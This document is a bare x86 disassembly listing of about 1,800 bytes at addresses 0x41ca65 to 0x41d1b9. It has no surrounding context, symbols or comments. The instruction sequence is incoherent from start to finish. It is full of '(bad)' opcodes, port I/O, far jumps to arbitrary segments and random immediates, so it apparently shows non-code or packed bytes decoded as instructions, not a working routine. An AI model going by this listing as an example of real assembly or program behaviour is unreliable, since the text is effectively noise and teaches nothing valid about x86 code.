  41ca65:	cmp    BYTE PTR [ebp-0x69379f5a],0xd8
  41ca6c:	loop   0x41ca57
  41ca6e:	ins    DWORD PTR es:[edi],dx
  41ca6f:	in     eax,0xe6
  41ca71:	pusha  
  41ca72:	xchg   edx,eax
  41ca73:	and    BYTE PTR [esi],dh
  41ca75:	lds    esp,FWORD PTR [ebx]
  41ca77:	push   ds
  41ca78:	inc    ebp
  41ca79:	inc    eax
  41ca7a:	aam    0x99
  41ca7c:	pushf  
  41ca7d:	jg     0x41ca08
  41ca7f:	jmp    0x326188c9
  41ca84:	dec    ecx
  41ca85:	aaa    
  41ca86:	dec    ebx
  41ca87:	fisubr WORD PTR [esi-0x292442fb]
  41ca8d:	test   DWORD PTR ds:[eax+0x32],0x18384baa
  41ca95:	pop    ebx
  41ca96:	inc    ebp
  41ca97:	jnp    0x41ca76
  41ca99:	xchg   edx,eax
  41ca9a:	je     0x41cb03
  41ca9c:	dec    eax
  41ca9d:	jmp    0x574e2308
  41caa2:	jecxz  0x41ca96
  41caa4:	out    0x4b,eax
  41caa6:	repz (bad) [ebx-0x1]
  41caaa:	cmp    DWORD PTR [ecx-0xac9457c],edx
  41cab0:	daa    
  41cab1:	aaa    
  41cab2:	mov    eax,cs:0xec31c03d
  41cab8:	ret    0x1520
  41cabb:	retf   0x67b6
  41cabe:	repnz or BYTE PTR [edi-0x2276cb8c],bh
  41cac5:	and    bh,BYTE PTR [edi-0x4a9ed77]
  41cacb:	rcl    DWORD PTR [edx],cl
  41cacd:	lods   eax,DWORD PTR ds:[esi]
  41cace:	jnp    0x41cae8
  41cad0:	ds mov esi,0x777136c1
  41cad6:	jbe    0x41cb3a
  41cad8:	push   es
  41cad9:	xchg   ebp,eax
  41cada:	inc    edx
  41cadb:	pop    ss
  41cadc:	fidivr DWORD PTR [edi+0x123ab208]
  41cae2:	jg     0x41cb50
  41cae4:	jg     0x41ca71
  41cae6:	stos   BYTE PTR es:[edi],al
  41cae7:	xor    DWORD PTR [eax+edx*2+0x7d5ca216],esi
  41caee:	nop
  41caef:	sub    BYTE PTR [eax+0x5f87e94d],al
  41caf5:	(bad)
  41caf9:	aam    0xd6
  41cafb:	mov    ax,ds:0x29829ef9
  41cb01:	xchg   edi,eax
  41cb02:	push   ebp
  41cb03:	xor    eax,0x2a03a8d5
  41cb08:	retf   0xad9e
  41cb0b:	aas    
  41cb0c:	and    DWORD PTR [eax-0x55],esp
  41cb0f:	bound  ecx,QWORD PTR [ebp+0x6b3068b2]
  41cb15:	jl     0x41ca9c
  41cb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb18:	idiv   ah
  41cb1a:	outs   dx,DWORD PTR ds:[esi]
  41cb1b:	std    
  41cb1c:	(bad)  
  41cb1d:	push   esi
  41cb1e:	mov    dl,0x4b
  41cb20:	mov    ch,0xce
  41cb22:	mov    BYTE PTR [eax],0x23
  41cb25:	imul   dh
  41cb27:	fidiv  WORD PTR [edx+0x6d492b48]
  41cb2d:	push   ds
  41cb2e:	jae    0x41caea
  41cb30:	loop   0x41cb46
  41cb32:	push   0x830c3de5
  41cb37:	loope  0x41cbb6
  41cb39:	or     al,BYTE PTR [ecx+edi*1]
  41cb3c:	and    BYTE PTR [ecx+0x290ef96a],bl
  41cb42:	inc    ebx
  41cb43:	jmp    0x30c79c11
  41cb48:	cmp    ebx,DWORD PTR [ecx-0x69]
  41cb4b:	(bad)  
  41cb4c:	mov    eax,ecx
  41cb4e:	dec    edi
  41cb4f:	loop   0x41cb36
  41cb51:	dec    ecx
  41cb52:	xor    al,0x36
  41cb54:	or     al,0x8d
  41cb56:	or     DWORD PTR [ebp-0xa],edi
  41cb59:	pushf  
  41cb5a:	inc    eax
  41cb5b:	rcl    DWORD PTR ss:[eax],0xc6
  41cb5f:	aaa    
  41cb60:	cmp    cl,dl
  41cb62:	test   BYTE PTR [edi+0x43f3da6a],dh
  41cb68:	dec    edx
  41cb69:	in     eax,0x85
  41cb6b:	mov    cl,0x66
  41cb6d:	xlat   BYTE PTR ds:[ebx]
  41cb6e:	ror    DWORD PTR es:[ebx],1
  41cb71:	or     al,0xb1
  41cb73:	or     ebx,edx
  41cb75:	ins    BYTE PTR es:[edi],dx
  41cb76:	sbb    BYTE PTR [edx+0x1e],dl
  41cb79:	shr    cl,cl
  41cb7b:	stc    
  41cb7c:	pop    ebx
  41cb7d:	stos   DWORD PTR es:[edi],eax
  41cb7e:	ja     0x41cb60
  41cb80:	push   ebp
  41cb81:	and    BYTE PTR [esi-0x456b94e],0xca
  41cb88:	ret    0x7de4
  41cb8b:	repz (bad) 
  41cb8d:	sub    eax,0x8c5283e0
  41cb92:	pop    edx
  41cb93:	cdq    
  41cb94:	jl     0x41cb92
  41cb96:	mov    al,cl
  41cb98:	and    al,0xa8
  41cb9a:	xor    eax,0x93e4ed83
  41cb9f:	push   ecx
  41cba0:	inc    ebx
  41cba1:	sbb    ebp,ebx
  41cba3:	out    0xdb,al
  41cba5:	iret   
  41cba6:	jb     0x41cb39
  41cba8:	mov    edx,0xe0a48258
  41cbad:	mov    esi,0xf2283282
  41cbb2:	xor    al,dl
  41cbb4:	loope  0x41cc18
  41cbb6:	pop    ss
  41cbb7:	xchg   esi,ecx
  41cbb9:	test   BYTE PTR [ecx-0x51],dh
  41cbbc:	add    BYTE PTR [bp+0x15],dl
  41cbc0:	push   edi
  41cbc1:	xor    ebx,DWORD PTR [eax+0x16870439]
  41cbc7:	outs   dx,BYTE PTR ds:[esi]
  41cbc8:	shl    ecx,cl
  41cbca:	std    
  41cbcb:	inc    edx
  41cbcc:	fistp  DWORD PTR [ebx]
  41cbce:	xchg   DWORD PTR ds:0xc3f1c05,edi
  41cbd4:	pushfw 
  41cbd6:	mov    ch,BYTE PTR [edx+0x31]
  41cbd9:	jmp    0x9c04:0x1dd180d6
  41cbe0:	out    dx,eax
  41cbe1:	push   ds
  41cbe2:	and    DWORD PTR [eax+0x29e4cf81],esp
  41cbe8:	sub    BYTE PTR [ecx-0xf15e3ac],al
  41cbee:	es xor eax,0x8f3ae39b
  41cbf4:	fwait
  41cbf5:	mov    ecx,0xad4809fb
  41cbfa:	jl     0x41cb98
  41cbfc:	mov    edi,0x28d40a5c
  41cc01:	(bad)  
  41cc02:	push   es
  41cc03:	pop    es
  41cc04:	scas   al,BYTE PTR es:[edi]
  41cc05:	int3   
  41cc06:	ror    esp,0xf6
  41cc09:	inc    ebp
  41cc0a:	add    ecx,DWORD PTR [ebx+0x121f2480]
  41cc10:	sbb    ecx,DWORD PTR [ecx]
  41cc12:	out    dx,eax
  41cc13:	neg    BYTE PTR [edi]
  41cc15:	xor    esi,ebp
  41cc17:	cmp    ebx,DWORD PTR [esi+0x6ec6414d]
  41cc1d:	mov    edx,0xddedc09d
  41cc22:	jmp    0x41ccfd
	...
  41cc2f:	add    BYTE PTR [eax],al
  41cc31:	cdq    
  41cc32:	ja     0x41cc23
  41cc34:	out    dx,al
  41cc35:	out    dx,eax
  41cc36:	(bad)  
  41cc37:	cdq    
  41cc38:	ja     0x41cbcf
  41cc3a:	daa    
  41cc3b:	xor    DWORD PTR ds:0x4cf4f0f7,ecx
  41cc41:	imul   ecx,DWORD PTR [eax+0x1],0x3ab00
  41cc48:	add    BYTE PTR [eax],dl
  41cc4a:	out    0xbf,al
  41cc4c:	push   ebx
  41cc4d:	cmp    edi,esp
  41cc4f:	jb     0x41cc34
  41cc51:	mov    ch,0x95
  41cc53:	jecxz  0x41cbe0
  41cc55:	aas    
  41cc56:	or     DWORD PTR [esi],esp
  41cc58:	dec    eax
  41cc59:	and    ah,BYTE PTR [edx]
  41cc5b:	jbe    0x41cc9f
  41cc5d:	and    al,0x6e
  41cc5f:	nop
  41cc60:	jb     0x41cca8
  41cc62:	cmp    dh,dl
  41cc64:	cmp    BYTE PTR [edx+0x49],ah
  41cc67:	jb     0x41cc8a
  41cc69:	loop   0x41ccb7
  41cc6b:	leave  
  41cc6c:	jg     0x41ccc5
  41cc6e:	lahf   
  41cc6f:	test   eax,0x1c255e91
  41cc74:	adc    al,0xf3
  41cc76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc77:	push   0xa21d80b6
  41cc7c:	xchg   esi,eax
  41cc7d:	dec    ebp
  41cc7e:	pusha  
  41cc7f:	mov    dl,0xcf
  41cc81:	sub    BYTE PTR [edx+0x45407ae7],bh
  41cc87:	fistp  WORD PTR [ebp+0x66]
  41cc8a:	icebp  
  41cc8b:	mov    gs,edx
  41cc8d:	iret   
  41cc8e:	outs   dx,BYTE PTR ds:[esi]
  41cc8f:	lock or eax,0x1c9ada56
  41cc95:	jecxz  0x41cc6c
  41cc97:	pusha  
  41cc98:	mov    cl,ch
  41cc9a:	outs   dx,BYTE PTR ds:[esi]
  41cc9b:	add    bh,dl
  41cc9d:	fwait
  41cc9e:	loop   0x41cc3f
  41cca0:	inc    ebp
  41cca1:	add    DWORD PTR gs:[esi+0x53b7f298],0x4f
  41cca9:	adc    cl,BYTE PTR [edx-0x34a026d4]
  41ccaf:	bound  ecx,QWORD PTR [ebx+esi*4+0x3f9da274]
  41ccb6:	pushf  
  41ccb7:	xchg   ecx,eax
  41ccb8:	ds enter 0xed31,0x10
  41ccbd:	adc    BYTE PTR [ebx],dl
  41ccbf:	lods   eax,DWORD PTR ds:[esi]
  41ccc0:	dec    esp
  41ccc1:	jp     0x41cc91
  41ccc3:	inc    eax
  41ccc4:	pop    ecx
  41ccc5:	leave  
  41ccc6:	push   ecx
  41ccc7:	cld    
  41ccc8:	xor    ah,bl
  41ccca:	dec    ecx
  41cccb:	aam    0x9d
  41cccd:	test   BYTE PTR [esi+edi*8],bl
  41ccd0:	lods   al,BYTE PTR ds:[esi]
  41ccd1:	mov    ?,WORD PTR [esi+0x76d465a3]
  41ccd7:	push   esp
  41ccd8:	out    dx,al
  41ccd9:	mov    ebp,0x91a0a910
  41ccde:	pop    eax
  41ccdf:	int3   
  41cce0:	jae    0x41ccdd
  41cce2:	cmc    
  41cce3:	cdq    
  41cce4:	repz jbe 0x41ccd8
  41cce7:	adc    eax,0xcf93ea5a
  41ccec:	mov    esp,0xe0d20a02
  41ccf1:	in     eax,0x75
  41ccf3:	xchg   edi,eax
  41ccf4:	loop   0x41cce7
  41ccf6:	push   ss
  41ccf7:	adc    eax,0xc478ff48
  41ccfc:	push   edx
  41ccfd:	push   ecx
  41ccff:	iret   
  41cd00:	cmp    al,0xed
  41cd02:	mov    dl,0xb0
  41cd04:	xchg   edx,eax
  41cd05:	mov    eax,0xab7f2981
  41cd0a:	ror    DWORD PTR [esi],1
  41cd0c:	rcl    BYTE PTR [esi+0x5dd6fdaf],cl
  41cd12:	jne    0x41cd3a
  41cd14:	ret    
  41cd15:	jno    0x41ccd1
  41cd17:	mov    bh,0xd
  41cd19:	in     eax,dx
  41cd1a:	pop    esp
  41cd1b:	fistp  WORD PTR [eax]
  41cd1d:	jmp    0x41cd8f
  41cd1f:	stos   BYTE PTR es:[edi],al
  41cd20:	loop   0x41cd6f
  41cd22:	(bad)  
  41cd23:	lahf   
  41cd24:	in     al,0x1
  41cd26:	adc    al,BYTE PTR [ebp+0x1e1e299e]
  41cd2c:	jnp    0x41cd10
  41cd2e:	sbb    DWORD PTR [ebx],0xe213326b
  41cd34:	push   ds
  41cd35:	pop    es
  41cd36:	inc    edi
  41cd37:	mov    bl,BYTE PTR [esp+esi*1-0x259e87a1]
  41cd3e:	sbb    edx,esp
  41cd40:	sub    dh,dh
  41cd42:	int3   
  41cd43:	clc    
  41cd44:	pusha  
  41cd45:	out    dx,eax
  41cd46:	xlat   BYTE PTR ds:[ebx]
  41cd47:	and    al,0x63
  41cd49:	icebp  
  41cd4a:	cs popa 
  41cd4c:	mov    dh,0x14
  41cd4e:	sbb    al,0xb3
  41cd50:	cli    
  41cd51:	aad    0x1f
  41cd53:	lods   eax,DWORD PTR ds:[esi]
  41cd54:	setno  BYTE PTR [esi+edi*2-0x19]
  41cd59:	icebp  
  41cd5a:	sbb    BYTE PTR [edi+0x68],0xb9
  41cd5e:	cmp    eax,0x2d1c47a3
  41cd63:	pop    edx
  41cd64:	or     bh,BYTE PTR [edi+0x2ec88b2c]
  41cd6a:	pop    ecx
  41cd6b:	pop    edi
  41cd6c:	mov    dl,0xdf
  41cd6e:	fcomp  QWORD PTR [eax+0x4b]
  41cd71:	test   eax,0x2d0e0ada
  41cd76:	push   ebp
  41cd77:	adc    DWORD PTR [esi],edx
  41cd79:	sub    al,0xde
  41cd7b:	sbb    al,0x4b
  41cd7d:	xchg   esi,eax
  41cd7e:	and    edx,DWORD PTR [ebx+ebp*2+0x77f8c610]
  41cd85:	mov    ch,0x23
  41cd87:	icebp  
  41cd88:	xchg   DWORD PTR [edx+0x68],edx
  41cd8b:	and    BYTE PTR [ebx+0x15],0x4b
  41cd8f:	or     DWORD PTR [eax+0x10],ebp
  41cd92:	(bad)  
  41cd93:	pop    esi
  41cd94:	fs ins BYTE PTR es:[edi],dx
  41cd96:	cmp    eax,0x14277873
  41cd9b:	(bad)  
  41cd9c:	call   0x88730a4d
  41cda1:	test   eax,0xb03296a3
  41cda6:	outs   dx,BYTE PTR ds:[esi]
  41cda7:	add    al,0x77
  41cda9:	adc    eax,0x911effe9
  41cdae:	cmc    
  41cdaf:	sbb    eax,ecx
  41cdb1:	dec    BYTE PTR [ebp+0x1c05eed7]
  41cdb7:	xchg   ebx,eax
  41cdb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdb9:	inc    ebx
  41cdba:	inc    ecx
  41cdbb:	popa   
  41cdbc:	push   edx
  41cdbd:	pop    eax
  41cdbe:	in     eax,0x8e
  41cdc0:	popa   
  41cdc1:	jle    0x41cd5a
  41cdc3:	push   ebp
  41cdc4:	adc    al,0xda
  41cdc6:	sub    DWORD PTR [esi+0x790e8a32],eax
  41cdcc:	xor    BYTE PTR ds:0xb3528809,ah
  41cdd2:	lea    ebp,[ecx+0x5ef5adac]
  41cdd8:	fcomp  st(4)
  41cdda:	in     al,0xeb
  41cddc:	xchg   esi,eax
  41cddd:	mov    DWORD PTR fs:[edx+0xd],eax
  41cde1:	xchg   ebx,eax
  41cde2:	pop    esi
  41cde3:	ins    BYTE PTR es:[edi],dx
  41cde4:	out    dx,eax
  41cde5:	add    DWORD PTR [ecx-0x7e],ebx
  41cde8:	ins    DWORD PTR es:[edi],dx
  41cde9:	mov    bl,0x24
  41cdeb:	int    0x1e
  41cded:	add    dh,dh
  41cdef:	ret    0x5035
  41cdf2:	cwde   
  41cdf3:	enter  0xfaf6,0x54
  41cdf7:	mov    dl,0x85
  41cdf9:	sar    BYTE PTR [ebx-0x41],0x48
  41cdfd:	xchg   ebx,eax
  41cdfe:	add    esp,DWORD PTR [esi+0x58da31a1]
  41ce04:	push   edi
  41ce05:	xchg   ebp,eax
  41ce06:	adc    esi,DWORD PTR [ecx+ecx*4+0x53]
  41ce0a:	pop    es
  41ce0b:	and    esp,DWORD PTR [ecx-0x500426a1]
  41ce11:	mov    gs,WORD PTR [ecx+0x12]
  41ce14:	sub    BYTE PTR [esi-0x71],0x72
  41ce18:	sti    
  41ce19:	cmp    BYTE PTR [edi-0x4f],al
  41ce1c:	in     al,0xc1
  41ce1e:	xchg   BYTE PTR [ebx-0x4],bh
  41ce21:	cmc    
  41ce22:	adc    eax,0x6ae14abb
  41ce27:	fs call 0x5375:0xcc4cfad6
  41ce2f:	or     al,BYTE PTR [ebp-0x7d38db7d]
  41ce35:	push   cs
  41ce36:	pop    edx
  41ce37:	jge    0x41cdd2
  41ce39:	pop    ecx
  41ce3a:	or     DWORD PTR [ecx-0x749b6985],ebx
  41ce40:	pop    ds
  41ce41:	lea    esp,[eax+esi*8]
  41ce44:	ds cmp dl,0x67
  41ce48:	les    eax,FWORD PTR [esi+0x6c3080b0]
  41ce4e:	add    edi,DWORD PTR [ecx]
  41ce50:	push   0xd0ab269e
  41ce55:	cmovle esi,DWORD PTR ds:0xc039d504
  41ce5c:	xchg   edx,eax
  41ce5d:	xlat   BYTE PTR ds:[ebx]
  41ce5e:	call   FWORD PTR [eax-0x5b28ebfe]
  41ce64:	in     al,dx
  41ce65:	or     DWORD PTR [ecx-0x1d],0xffffffb6
  41ce69:	in     al,0x85
  41ce6b:	sub    BYTE PTR [esi+0x73645eca],bh
  41ce71:	stc    
  41ce72:	jbe    0x41ce32
  41ce74:	(bad)  
  41ce75:	adc    edx,edi
  41ce77:	or     BYTE PTR [esi+0x3a],bh
  41ce7a:	jecxz  0x41ce90
  41ce7c:	lds    ebp,FWORD PTR [esi]
  41ce7e:	out    0x1a,al
  41ce80:	jbe    0x41cec4
  41ce82:	in     eax,dx
  41ce83:	test   DWORD PTR [eax-0x525e84de],ebp
  41ce89:	dec    ebp
  41ce8a:	mov    esp,eax
  41ce8c:	rcl    BYTE PTR [esi],0xdb
  41ce8f:	inc    esp
  41ce90:	loope  0x41cf03
  41ce92:	das    
  41ce93:	cmp    al,0x11
  41ce95:	les    ebx,FWORD PTR [eax]
  41ce97:	sbb    eax,0x9bc5dfdd
  41ce9c:	cmc    
  41ce9d:	sti    
  41ce9e:	push   eax
  41ce9f:	and    BYTE PTR [eax-0x3cbc8184],ch
  41cea5:	lahf   
  41cea6:	adc    dh,BYTE PTR [ebx-0x46]
  41cea9:	pop    esp
  41ceaa:	push   cs
  41ceab:	inc    ebx
  41ceac:	icebp  
  41cead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceae:	add    BYTE PTR [ebp-0x64],dh
  41ceb1:	or     DWORD PTR [edi-0x54],esi
  41ceb4:	sbb    al,ch
  41ceb6:	sub    esp,DWORD PTR [edi-0x67]
  41ceb9:	gs je  0x41ceaa
  41cebc:	cmc    
  41cebd:	dec    esi
  41cebe:	xchg   edx,eax
  41cebf:	sub    edi,DWORD PTR [ebp-0x39c9475]
  41cec5:	mov    dl,0xef
  41cec7:	jns    0x41cf14
  41cec9:	stos   DWORD PTR es:[edi],eax
  41ceca:	pop    ebx
  41cecb:	repz daa 
  41cecd:	pop    ebx
  41cece:	out    dx,eax
  41cecf:	or     DWORD PTR [esi+eiz*4-0x45fe935d],eax
  41ced6:	mov    al,ds:0x50e467de
  41cedb:	xor    eax,0x89abb378
  41cee0:	sbb    BYTE PTR [ebx+0x606a4ad0],dl
  41cee6:	push   ebx
  41cee7:	mov    dl,0x17
  41cee9:	neg    esp
  41ceeb:	nop
  41ceec:	pop    ebx
  41ceed:	imul   BYTE PTR ds:0xba150eab
  41cef3:	mov    ebp,DWORD PTR [ecx+0x2e]
  41cef6:	fidivr WORD PTR [edi+edi*8-0x2baad6b5]
  41cefd:	retf   0x83ca
  41cf00:	test   DWORD PTR [edi+0x3cb04434],ebx
  41cf06:	loopne 0x41ced8
  41cf08:	mov    dh,0x2b
  41cf0a:	add    DWORD PTR [ecx],ebx
  41cf0c:	or     eax,0xc49100c4
  41cf11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf12:	sahf   
  41cf13:	push   edi
  41cf14:	sbb    bh,bl
  41cf16:	mov    esp,0xeb878598
  41cf1b:	xor    al,0x34
  41cf1d:	pop    ebp
  41cf1e:	les    edi,FWORD PTR [edi-0x106ecf8]
  41cf24:	ret    0xc9b
  41cf27:	pop    esp
  41cf28:	pop    edx
  41cf29:	mov    dl,0xea
  41cf2b:	sub    eax,0x4f107cd3
  41cf30:	mov    ah,0x1d
  41cf32:	loope  0x41cf9a
  41cf34:	ret    
  41cf35:	inc    edx
  41cf36:	cli    
  41cf37:	stc    
  41cf38:	scas   al,BYTE PTR es:[edi]
  41cf39:	arpl   WORD PTR [esi-0x2b],ax
  41cf3c:	sbb    eax,0x9424f699
  41cf41:	or     ah,BYTE PTR [edi+ebx*4-0x4a]
  41cf45:	sbb    bh,bh
  41cf47:	dec    ecx
  41cf48:	imul   edx,edx,0x21
  41cf4b:	repnz rcl bh,0x6b
  41cf4f:	inc    esp
  41cf50:	dec    ebp
  41cf51:	xchg   ebx,eax
  41cf52:	outs   dx,BYTE PTR ds:[esi]
  41cf53:	fcom   DWORD PTR [eax+ecx*8]
  41cf56:	outs   dx,DWORD PTR ds:[esi]
  41cf57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf58:	mov    dl,0xc
  41cf5a:	inc    edx
  41cf5b:	push   0x72
  41cf5d:	call   0xce7051b2
  41cf62:	push   edi
  41cf63:	repnz push cs
  41cf65:	mov    eax,ds:0x14526909
  41cf6a:	repnz adc eax,DWORD PTR [edi]
  41cf6d:	sar    ebp,0x16
  41cf70:	icebp  
  41cf71:	das    
  41cf72:	inc    ebp
  41cf73:	int    0x19
  41cf75:	push   edi
  41cf76:	and    ecx,esi
  41cf78:	lds    edi,FWORD PTR [esi+0x74]
  41cf7b:	lods   eax,DWORD PTR ds:[esi]
  41cf7c:	(bad)  
  41cf7d:	mov    ds:0x76265577,al
  41cf82:	iret   
  41cf83:	loope  0x41cfc9
  41cf85:	in     al,0x19
  41cf87:	sub    eax,0x542db36b
  41cf8c:	mov    ?,ebp
  41cf8e:	jg     0x41cf5f
  41cf90:	dec    ebx
  41cf91:	jecxz  0x41cfcd
  41cf93:	ins    BYTE PTR es:[edi],dx
  41cf94:	arpl   WORD PTR [ebp+0x6aa957f1],cx
  41cf9a:	shl    BYTE PTR ds:0x4829a33,cl
  41cfa0:	lahf   
  41cfa1:	and    DWORD PTR [ebp-0x7c],ebx
  41cfa4:	cmp    DWORD PTR [esp+esi*8+0x5c],edi
  41cfa8:	sub    DWORD PTR [edi],0x892bbdf9
  41cfae:	mov    cl,0x26
  41cfb0:	sar    DWORD PTR [ebp+0x2],1
  41cfb3:	dec    eax
  41cfb4:	int3   
  41cfb5:	call   0x6904:0xa4c8c184
  41cfbc:	call   0x3707:0xe01d6ef2
  41cfc3:	xchg   ebx,eax
  41cfc4:	mov    gs,WORD PTR [ecx-0x3b]
  41cfc7:	jp     0x41cf94
  41cfc9:	push   ebx
  41cfca:	cmp    eax,edi
  41cfcc:	ret    
  41cfcd:	in     eax,0xf4
  41cfcf:	scas   eax,DWORD PTR es:[edi]
  41cfd0:	sub    dl,BYTE PTR [ebx-0x28b4b073]
  41cfd6:	aaa    
  41cfd7:	pop    es
  41cfd8:	pop    esi
  41cfd9:	add    eax,0x10f0084b
  41cfde:	scas   eax,DWORD PTR es:[edi]
  41cfdf:	stos   DWORD PTR es:[edi],eax
  41cfe0:	cmp    ebp,DWORD PTR [edi-0xd]
  41cfe3:	mov    edi,0x6b9ca03e
  41cfe8:	jle    0x41cfad
  41cfea:	std    
  41cfeb:	jp     0x41cf9f
  41cfed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfee:	out    dx,al
  41cfef:	shl    BYTE PTR [ebp-0x4f],1
  41cff2:	inc    esi
  41cff3:	pop    ecx
	...
  41d000:	add    BYTE PTR [edx-0x217875bc],dl
  41d006:	iret   
  41d007:	lahf   
  41d008:	push   ebp
  41d009:	loop   0x41cf9a
  41d00b:	aad    0x3
  41d00d:	into   
  41d00e:	push   edx
  41d00f:	mov    esp,0x14c149e
  41d014:	add    BYTE PTR [ebx+0x32000003],ch
  41d01a:	(bad)  
  41d01b:	repnz into 
  41d01d:	lea    ebp,[edx+eiz*4+0x36]
  41d021:	inc    di
  41d023:	lock lahf 
  41d025:	or     BYTE PTR [esi-0x6a4341f2],bl
  41d02b:	(bad)  
  41d02c:	ds aam 0xfc
  41d02f:	gs inc eax
  41d031:	iret   
  41d032:	push   es
  41d033:	and    edi,esp
  41d035:	adc    ebp,DWORD PTR [ebx+0x283d2479]
  41d03b:	adc    eax,ecx
  41d03d:	daa    
  41d03e:	lahf   
  41d03f:	add    bl,BYTE PTR [eax+0x7d22986c]
  41d045:	push   ebp
  41d046:	out    0x8,al
  41d048:	repnz push edx
  41d04a:	leave  
  41d04b:	dec    eax
  41d04c:	in     al,0x8e
  41d04e:	jbe    0x41d08b
  41d050:	ror    DWORD PTR [eax+0x123f6bcf],1
  41d056:	inc    edx
  41d057:	sbb    eax,0x676b4eb
  41d05c:	adc    al,0x6b
  41d05e:	gs mov dl,0x39
  41d061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d062:	inc    eax
  41d063:	cmp    bl,BYTE PTR [edi-0x3a32f2e0]
  41d069:	adc    al,0xe1
  41d06b:	mov    esi,gs
  41d06d:	add    esi,DWORD PTR [edi+0x3]
  41d070:	cs loop 0x41d087
  41d073:	into   
  41d074:	xor    eax,0xf3cc21c1
  41d079:	arpl   WORD PTR [eax+edi*1-0x4e69aeab],di
  41d080:	mov    al,ds:0xbf9c8004
  41d085:	mov    ds:0x13e9b5e0,eax
  41d08a:	add    DWORD PTR [edi-0x4e3e362a],esp
  41d090:	in     eax,dx
  41d091:	int    0xf2
  41d093:	sbb    BYTE PTR [ecx-0x6a],cl
  41d096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d097:	pop    edx
  41d098:	les    esi,FWORD PTR [edi+0x65]
  41d09b:	jl     0x41d09e
  41d09d:	lods   al,BYTE PTR ds:[esi]
  41d09e:	mov    ch,0xbe
  41d0a0:	mov    ds:0x23058bb0,eax
  41d0a5:	les    eax,FWORD PTR [ecx-0x59]
  41d0a8:	xor    al,0x30
  41d0aa:	jp     0x41d103
  41d0ac:	pop    ebp
  41d0ad:	xlat   BYTE PTR ds:[ebx]
  41d0ae:	dec    esi
  41d0af:	cmp    ch,ch
  41d0b1:	stos   DWORD PTR es:[edi],eax
  41d0b2:	xchg   esi,eax
  41d0b3:	pop    ebp
  41d0b4:	cwde   
  41d0b5:	jnp    0x41d0bc
  41d0b7:	add    eax,0x5417619c
  41d0bc:	popf   
  41d0bd:	dec    esp
  41d0be:	in     al,dx
  41d0bf:	jne    0x41d0a5
  41d0c1:	popf   
  41d0c2:	and    DWORD PTR [ecx-0x45],esp
  41d0c5:	cld    
  41d0c6:	in     eax,dx
  41d0c7:	sbb    ebx,DWORD PTR [ecx+0x59]
  41d0ca:	add    esp,DWORD PTR [ecx+0x5a41a703]
  41d0d0:	jmp    0xe59a:0xb4e37795
  41d0d7:	aad    0xd2
  41d0d9:	fstp   TBYTE PTR [ebp-0x44e958be]
  41d0df:	fucom  st(1)
  41d0e1:	lahf   
  41d0e2:	rcl    BYTE PTR [edi+0x2a64034e],cl
  41d0e8:	stos   BYTE PTR es:[edi],al
  41d0e9:	jmp    0xa2bdbe26
  41d0ee:	mov    ecx,0xbd9c672f
  41d0f3:	push   eax
  41d0f4:	jmp    0x2bc1:0x822a03a7
  41d0fb:	out    dx,eax
  41d0fc:	or     ecx,edi
  41d0fe:	mov    esi,0x20e10dcf
  41d103:	jmp    0xcd103e55
  41d108:	out    0xac,al
  41d10a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10b:	pushf  
  41d10c:	sbb    al,0x82
  41d10e:	enter  0x4c34,0xbd
  41d112:	add    eax,0x7e78b5f5
  41d117:	cmc    
  41d118:	push   cs
  41d119:	sub    edi,0x3f
  41d11c:	(bad)  
  41d11d:	data16 idiv BYTE PTR [ecx-0x4fb88e2a]
  41d124:	xchg   esp,eax
  41d125:	pop    edi
  41d126:	inc    eax
  41d127:	sbb    al,BYTE PTR [eax+0x3e]
  41d12a:	mov    ds:0x6636fc0a,eax
  41d12f:	xchg   ebx,eax
  41d130:	lods   al,BYTE PTR cs:[esi]
  41d132:	cmc    
  41d133:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d135:	sbb    eax,0x69f36806
  41d13a:	sub    esp,DWORD PTR [eax]
  41d13c:	adc    ch,BYTE PTR [esi+0x6a]
  41d13f:	pop    es
  41d140:	aaa    
  41d141:	sbb    cl,BYTE PTR [eax-0x13d2d2d9]
  41d147:	cmp    al,0x39
  41d149:	stc    
  41d14a:	arpl   WORD PTR fs:[eax+0x5a1a9e04],bx
  41d151:	dec    edx
  41d152:	jmp    0xb0cb:0xa0fdae3b
  41d159:	jo     0x41d11f
  41d15b:	cmc    
  41d15c:	push   ss
  41d15d:	mov    cs,WORD PTR [ebx]
  41d15f:	daa    
  41d160:	jp     0x41d11b
  41d162:	push   ds
  41d163:	leave  
  41d164:	and    cl,BYTE PTR [ebx-0x17]
  41d167:	mov    al,0xe0
  41d169:	aaa    
  41d16a:	and    cl,bl
  41d16c:	jl     0x41d116
  41d16e:	stos   DWORD PTR es:[edi],eax
  41d16f:	pop    edi
  41d170:	sub    al,BYTE PTR [esp]
  41d173:	ret    0x88e0
  41d176:	pusha  
  41d177:	adc    al,0x1d
  41d179:	or     bh,cl
  41d17b:	outs   dx,DWORD PTR ds:[esi]
  41d17c:	xchg   esp,eax
  41d17d:	fadd   DWORD PTR [eax+0x35]
  41d180:	push   ebp
  41d181:	repnz xor eax,esp
  41d184:	int    0xe7
  41d186:	cmp    DWORD PTR [ecx],ecx
  41d188:	mov    eax,0xa6f96a6c
  41d18d:	pop    edx
  41d18e:	shl    DWORD PTR [esi+ebp*2],0xe0
  41d192:	and    eax,0xef7cb86a
  41d197:	out    dx,eax
  41d198:	shr    BYTE PTR [ebp-0xb999021],cl
  41d19e:	adc    BYTE PTR [edi+edx*1+0x1af5db51],ah
  41d1a5:	add    ebp,DWORD PTR [ebx+ebp*8]
  41d1a8:	push   0x3a89b83c
  41d1ad:	mov    ah,0x4
  41d1af:	mov    WORD PTR [esp+esi*2],?
  41d1b2:	mov    edi,0x7ab66850
  41d1b7:	daa    
  41d1b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1b9:	imul   esp,DWORD PTR [eax-0x4e],0xf79e25ae
